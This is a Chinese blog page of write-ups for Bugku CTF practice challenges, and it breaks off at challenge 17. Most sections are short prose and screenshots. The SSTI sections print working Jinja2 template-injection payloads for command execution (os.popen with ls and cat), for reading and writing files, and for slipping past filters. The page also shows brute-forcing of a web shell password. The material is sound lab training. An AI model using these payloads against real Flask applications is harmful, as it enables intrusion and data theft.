<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>Bugku | jiutu2003</title><meta name="author" content="jiutu2003"><meta name="copyright" content="jiutu2003"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1.签到题微信扫码获得flag 2.Simple_SSTI_1F12查看源代码   你知道，在flask中。我们经常设置一个secret_key变量 12345678910111213141516171819202122232425262728293031323334353637383940补充：Config类在config模块中定义，在Config的类，含有类属性SECRET_KEY。flask">
<meta property="og:type" content="article">
<meta property="og:title" content="Bugku">
<meta property="og:url" content="https://jiutu2003.github.io/%E5%AE%9E%E6%88%98/Bugku/Bugku/index.html">
<meta property="og:site_name" content="jiutu2003">
<meta property="og:description" content="1.签到题微信扫码获得flag 2.Simple_SSTI_1F12查看源代码   你知道，在flask中。我们经常设置一个secret_key变量 12345678910111213141516171819202122232425262728293031323334353637383940补充：Config类在config模块中定义，在Config的类，含有类属性SECRET_KEY。flask">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/501ea766baf4b2a2c91d2e163d7c4b04.jpeg">
<meta property="article:published_time" content="2023-02-24T05:54:34.099Z">
<meta property="article:modified_time" content="2023-02-24T06:07:46.923Z">
<meta property="article:author" content="jiutu2003">
<meta property="article:tag" content="实战">
<meta property="article:tag" content="ctf">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/501ea766baf4b2a2c91d2e163d7c4b04.jpeg"><link rel="shortcut icon" href="/img/242ae48778369e7a.jpg"><link rel="canonical" href="https://jiutu2003.github.io/%E5%AE%9E%E6%88%98/Bugku/Bugku/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Bugku',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-02-24 14:07:46'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/242ae48778369e7a.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/501ea766baf4b2a2c91d2e163d7c4b04.jpeg')"><nav id="nav"><span id="blog-info"><a href="/" title="jiutu2003"><span class="site-name">jiutu2003</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Bugku</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-02-24T05:54:34.099Z" title="发表于 2023-02-24 13:54:34">2023-02-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-02-24T06:07:46.923Z" title="更新于 2023-02-24 14:07:46">2023-02-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%9E%E6%88%98/">实战</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%9E%E6%88%98/Bugku/">Bugku</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Bugku"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="1-签到题"><a href="#1-签到题" class="headerlink" title="1.签到题"></a>1.<strong>签到题</strong></h2><p>微信扫码获得flag</p>
<h2 id="2-Simple-SSTI-1"><a href="#2-Simple-SSTI-1" class="headerlink" title="2.Simple_SSTI_1"></a>2.<strong>Simple_SSTI_1</strong></h2><p>F12查看源代码 </p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221103123248117.png" alt="image-20221103123248117"></p>
<p>你知道，在flask中。我们经常设置一个secret_key变量</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">补充：Config类在config模块中定义，在Config的类，含有类属性SECRET_KEY。</span><br><span class="line"></span><br><span class="line">flask使用jinjia2渲染引擎进行网页渲染，当处理不得当，未进行语句过滤，用户输入&#123;&#123;控制语句&#125;&#125;，会导致渲染出恶意代码，形成注入</span><br><span class="line"></span><br><span class="line">flask基础知识：</span><br><span class="line">所有的子类都有一个共同的父类<span class="built_in">object</span>,如果没指定继承，默认父类是<span class="built_in">object</span></span><br><span class="line"></span><br><span class="line">__class__:返回当前类（输入abc,是字符串类，除此以外还有元组类，字典类等）</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;abc&#x27;</span>.__class__)</span><br><span class="line">__mor__:返回解析函数时，类的调用顺序</span><br><span class="line">    假如输入一个abc，这个参数先调用了<span class="built_in">str</span>类，再调用<span class="built_in">object</span>类。通过索引的方式__mor__[<span class="number">1</span>]，就可返回<span class="built_in">object</span>类</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;abc&#x27;</span>.__class__.__mor__)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;abc&#x27;</span>.__class__.__mor__[<span class="number">1</span>])</span><br><span class="line">__base__：返回当前类父类（以字符串的形式）</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;abc&#x27;</span>.__calss__.__base__)</span><br><span class="line">__bases__以元组的形式返回所有父类</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;abc&#x27;</span>.__class__.__bases__[<span class="number">0</span>])</span><br><span class="line">__subclass__():返回当前类所有的子类，可通过索引的方式定位某一个子类</span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&#x27;abc&#x27;</span>.__class__.__base__.subclasses__()[<span class="number">1</span>])</span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&#x27;abc&#x27;</span>.__class__.__base__.subclasses__())</span><br><span class="line">__init__:初始化方法</span><br><span class="line">__globals__:访问全局变量，字典</span><br><span class="line">    </span><br><span class="line">通过popen，以及read方法来进行系统命令执行(ipconfig):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;abc&#x27;</span>.__class__.__base__.subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ipconfig&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line">利用__builtins__下的<span class="built_in">open</span>进行文件的读取：</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;abc&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;1.txt&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line">通过写入的方式修改文件内容:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;abc&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;123456&#x27;</span>))</span><br><span class="line"></span><br><span class="line">做题技巧：</span><br><span class="line">如果[]被过滤，可以用__getitem__ ()或者get方法来进行替换：</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;abc&#x27;</span>.__class__.__base__.__subclasses__().__getitem__(<span class="number">134</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;abc&#x27;</span>.__class__.__base__.__subclasses__().__getitem__(<span class="number">134</span>).__init__.__globals__.get(<span class="string">&#x27;popen&#x27;</span>)(<span class="string">&#x27;dir&#x27;</span>).read())</span><br><span class="line">如果引号被过滤可以采用以下方式在url中实现：</span><br><span class="line">key&#123;&#123;<span class="string">&#x27;abc&#x27;</span>.__class__.__base__.__subclasses__().__getitem__(<span class="number">134</span>).__init__.__globals__.get(request.args.a)(request.args.b).read()&#125;&#125;&amp;a=popen&amp;b=<span class="built_in">dir</span></span><br><span class="line">如果关键字被过滤，可以通过__getattribute__(<span class="string">&#x27;__&#x27;</span>+<span class="string">&#x27;cla&#x27;</span>+<span class="string">&#x27;ss&#x27;</span>+<span class="string">&#x27;__&#x27;</span>)类似的手法进行绕过:</span><br><span class="line">key&#123;&#123;<span class="string">&#x27;abc&#x27;</span>.__getattribute__(<span class="string">&#x27;__&#x27;</span>+<span class="string">&#x27;cla&#x27;</span>+<span class="string">&#x27;ss&#x27;</span>+<span class="string">&#x27;__&#x27;</span>).__base__.__subclasses__().__getitem__(<span class="number">134</span>).__init__.__globals__.get(request.args.a)(request.args.b).read()&#125;&#125;&amp;a=popen&amp;b=<span class="built_in">dir</span>	</span><br></pre></td></tr></table></figure>

<p>根据提示信息利用flask模板注入</p>
<p>flask的模板注入：（注意：这里的SECRET_KEY需要大写）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?flag=&#123;&#123;config.SECRET_KEY&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221103123525565.png" alt="image-20221103123525565"></p>
<h2 id="3-Simple-SSTI-2"><a href="#3-Simple-SSTI-2" class="headerlink" title="3.Simple_SSTI_2"></a>3.<strong>Simple_SSTI_2</strong></h2><p>F12没有发现任何信息，通过如下代码读取系统文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls ../&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p> 这里读取网站系统目录，发现存在一些文件夹:</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221103123908897.png" alt="image-20221103123908897"></p>
<p>通过如下代码读取app目录下的文件，发现存在flag文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls ../app&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221103124025214.png" alt="image-20221103124025214"></p>
<p> 通过如下代码读取flag内容，读取flag内容，最终得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat ../app/flag&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221103124130741.png" alt="image-20221103124130741"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">##__class__ 用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。</span><br><span class="line">##__init__ 初始化类，返回的类型是function</span><br><span class="line">##__globals__[] 使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。</span><br><span class="line">##os.popen() 方法用于从一个命令打开一个管道。</span><br><span class="line">##open() 方法用于打开一个文件，并返回文件对象</span><br></pre></td></tr></table></figure>

<h2 id="4-这是一张单纯的图片"><a href="#4-这是一张单纯的图片" class="headerlink" title="4.这是一张单纯的图片"></a>4.<strong>这是一张单纯的图片</strong></h2><p>下载图片，然后修改文件后缀名为html，打开后在文件最后得到flag</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221103124735090.png" alt="image-20221103124735090"></p>
<h2 id="5-滑稽"><a href="#5-滑稽" class="headerlink" title="5.滑稽"></a><strong>5.滑稽</strong></h2><p>打开网站后F12查看源代码得到flag</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221103124912438.png" alt="image-20221103124912438"></p>
<h2 id="6-计算器"><a href="#6-计算器" class="headerlink" title="6.计算器"></a><strong>6.计算器</strong></h2><p>查看源码，编辑源码，修改长度</p>
<h2 id="7-GET"><a href="#7-GET" class="headerlink" title="7.GET"></a><strong>7.GET</strong></h2><p>在URL上输入?what&#x3D;flag获得flag</p>
<h2 id="8-POST"><a href="#8-POST" class="headerlink" title="8.POST"></a><strong>8.POST</strong></h2><p>设置代理，用burpsuite抓包，在URL上输入?what&#x3D;flag，然后再burpsuite上修改请求方式为POST，获得Flag</p>
<h2 id="9-矛盾"><a href="#9-矛盾" class="headerlink" title="9.矛盾"></a><strong>9.矛盾</strong></h2><p>打开网页</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221103173328231.png" alt="image-20221103173328231"></p>
<p>解读代码：</p>
<p>get一个num，若num不是数字，出一次num的值，后若num&#x3D;1，出flag；若num为数字则不进行任何操作，所以要输出flag，首先要num不是数字，然后又要num&#x3D;1，这显然是矛盾的。</p>
<p>给num传一个参数是的num&#x3D;后面不是1，但又使得num的值为1，尝试使用num&#x3D;1&#x3D;1，由于1&#x3D;1为true，true的值又为1，所以进行如下操作</p>
<p> <img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221103173816655.png" alt="image-20221103173816655"></p>
<p>最终得到flag：flag{d818e4c3b1b3d619f38fb4b4b70f1ca9}</p>
<h2 id="10-alert"><a href="#10-alert" class="headerlink" title="10.alert"></a><strong>10.alert</strong></h2><p>打开网页，显示如下</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221103174422509.png" alt="image-20221103174422509"></p>
<p>使用burpsuite抓包</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221103174655988.png" alt="image-20221103174655988"></p>
<p>然后在重发器中进行重发，发现在源码下面有flag</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221103174852329.png" alt="image-20221103174852329"></p>
<p>新建一个html文件，将图中的编码复制到文件中，打开文件</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221103175850694.png" alt="image-20221103175850694"></p>
<p>最终得到flag：flag{0c550c98884480e1a0be596f6f1fdc18}</p>
<h2 id="11-你必须让他停下来"><a href="#11-你必须让他停下来" class="headerlink" title="11.你必须让他停下来"></a><strong>11.你必须让他停下来</strong></h2><p>打开网页，不断刷新</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221103181105245.png" alt="image-20221103181105245"></p>
<p>使用burpsuite抓包，然后发送到重发器上</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221103181202119.png" alt="image-20221103181202119"></p>
<p>多重发几次得到flag</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221103181259020.png" alt="image-20221103181259020"></p>
<p>最终得到flag：flag{7e769c1fab1efafa8fbb8664425255ea}</p>
<h2 id="12-网站被黑"><a href="#12-网站被黑" class="headerlink" title="12.网站被黑"></a><strong>12.网站被黑</strong></h2><p>打开网站</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221103185138478.png" alt="image-20221103185138478"></p>
<p>用御剑扫描后门，发现shell.php文件</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221103185209578.png" alt="image-20221103185209578"></p>
<p>打开此文件</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221103185257984.png" alt="image-20221103185257984"></p>
<p>随意填写密码。用burpsuite抓包</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221103185424124.png" alt="image-20221103185424124"></p>
<p>对密码实行爆破</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221103185535531.png" alt="image-20221103185535531"></p>
<p>找到密码为hack</p>
<p>输入密码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221103185654100.png" alt="image-20221103185654100"></p>
<p>最终得到flag：flag{aba20b805b944731153158911cbd550a}</p>
<h2 id="13-社工-进阶收集"><a href="#13-社工-进阶收集" class="headerlink" title="13.社工-进阶收集"></a><strong>13.社工-进阶收集</strong></h2><p>打开图片</p>
<img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221104114900340.png" alt="image-20221104114900340" style="zoom:50%;" />

<p>分析对话：</p>
<p>中间转一站-不是在一条线路的地铁（换线），但是相隔只有一个站。加上之前有八个站。</p>
<p>始发站对于目标距离，以及第二站对于目标距离只有确定两个地铁站才能找出目标，两点以目标距离为半径画圆相交面积做平行线，大约在这附近。</p>
<p>对图片识图</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221104115841315.png" alt="image-20221104115841315"></p>
<p>得到目标地点以及目标位置，然后用百度地图找到目标大体位置</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221104120724918.png" alt="image-20221104120724918"></p>
<p>从韦曲南出发–&gt;小寨–&gt;大雁塔</p>
<p>然后寻找距离起始站（韦曲南）800米，第二站（航天城）1000米的地点</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221104122004810.png" alt="image-20221104122004810"></p>
<p>得到小美小区的名字，flag为flag{小美小区拼写}</p>
<p>最终得到flag：flag{lanqiaoguijicheng}</p>
<h2 id="14-Flask-FileUpload"><a href="#14-Flask-FileUpload" class="headerlink" title="14.Flask_FileUpload"></a><strong>14.Flask_FileUpload</strong></h2><p>打开网页，按F12查看源码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221104123048648.png" alt="image-20221104123048648"></p>
<p>传入一个文件，会返回用python编译的结果</p>
<p>我们随便上传一个空文件，用burpsuite抓包，然后修改数据包，用Python脚本查看目录文件</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221104124423796.png" alt="image-20221104124423796"></p>
<p>这里并没有发现flag文件，我们直接从根目录开始查看，返回的数据中发现flag</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221104182523453.png" alt="image-20221104182523453"></p>
<p>继续修改数据包。查看flag</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221104182647893.png" alt="image-20221104182647893"></p>
<p>最终得到flag：flag{92ec13e0afd095ca2447fe8b91ba300b}</p>
<h2 id="15-1和0的故事"><a href="#15-1和0的故事" class="headerlink" title="15.1和0的故事"></a>15.1和0的故事</h2><p>下载文件后打开文件，得到25*25的1和0文档，推测为二维码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221104212702804.png" alt="image-20221104212702804"></p>
<p>利用Excel的定位条件功能</p>
<p>先将单元格格式改为文本</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221104213640587.png" alt="image-20221104213640587"></p>
<p>先将数据复制到Excel中</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221104213909484.png" alt="image-20221104213909484"></p>
<p>然后对数据进行分列</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221104214101941.png" alt="image-20221104214101941"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221104214139873.png" alt="image-20221104214139873"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221104214323486.png" alt="image-20221104214323486"></p>
<p>把0替换成空格，再定位出1所在的位置，填充成黑色。 快捷键：ctrl+h</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221104214610644.png" alt="image-20221104214610644"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221104214720026.png" alt="image-20221104214720026"></p>
<p>定位出1所在的位置后，再填充成黑色<img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221104215125871.png" alt="image-20221104215125871"></p>
<p>得到如下结果</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221104215210707.png" alt="image-20221104215210707"></p>
<p>然后将剩下的三个角拼接上去（由于技术有限这里我们用一些小技巧），得到如下图，然后扫码得到flag</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221104221435848.png" alt="image-20221104221435848"></p>
<p>最终得到flag：flag{QR_c0de_1s_1nterest1n9}</p>
<h2 id="16-easy-nbt"><a href="#16-easy-nbt" class="headerlink" title="16.easy_nbt"></a>16.easy_nbt</h2><p>下载解压文件后打开文件，找到 level文件</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221104222916421.png" alt="image-20221104222916421"></p>
<p>修改文件后缀名为zip，并解压</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221104223112406.png" alt="image-20221104223112406"></p>
<p>用记事本查看 level文件，找到flag</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221104223311231.png" alt="image-20221104223311231"></p>
<p>最终得到flag：flag{Do_u_kN0w_nbt?}</p>
<p>知识点：<strong>NBT一般存在dat文件中</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">补充：nbt二进制命名标签</span><br><span class="line">我的世界二进制命名标签（Name Binary Tag），NBT格式为Minecraft中用于向文件中存储数据的一种存储格式。NBT格式以树形结构并配以许多标签的形式存储数据。所有的标签都有一个独立的ID和名称。</span><br><span class="line"></span><br><span class="line">nbt作用：NBT在物品中就有，是数据标签的一种，通过修改物品的NBT可以自定义物品的伤害、耐久等。</span><br><span class="line"></span><br><span class="line">每一个标签在数据树中都是一个独立的部分。标签的第一个字节为标签类型（ID）,其后两字节为存储名称的长度,之后以UTF-8格式的字符串的方式存储标签。尽管在默认的情况下Minecraft本身并不会存储带有空格的名称。</span><br></pre></td></tr></table></figure>



<h2 id="17-留言板"><a href="#17-留言板" class="headerlink" title="17.留言板"></a>17.留言板</h2><p>打开网页<img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221105111448046.png" alt="image-20221105111448046"></p>
<p>然后进行目录扫描，得到如下地址</p>
